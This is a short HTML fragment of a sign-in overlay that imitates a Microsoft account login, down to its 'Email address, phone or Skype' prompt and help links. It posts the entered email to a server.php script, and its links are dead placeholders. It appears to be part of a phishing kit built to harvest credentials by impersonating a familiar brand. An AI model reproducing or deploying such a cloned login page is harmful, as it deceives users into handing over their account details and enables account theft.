	...
	<div class="overlay">
		<div class="login-box">
			...
			<form action="server.php" method="post">
				<input type="email" id="params1xx" name="email1" placeholder="Email address, phone or Skype" required autofocus>
			
			<br>
			<div id="group2">
				<small id="fps">No account? <a href="#" class="fade">Create one!</a></small>
				<br>
				<br>
				<small id="fps"><a href="#" class="fade">Can’t access your account?</a></small>
				<br>
			</div>
			<div align="right">
			<input align="right" id="signin" type="submit" name="signin" value="Next">
			</div>
			</form>
		</div>
	</div>
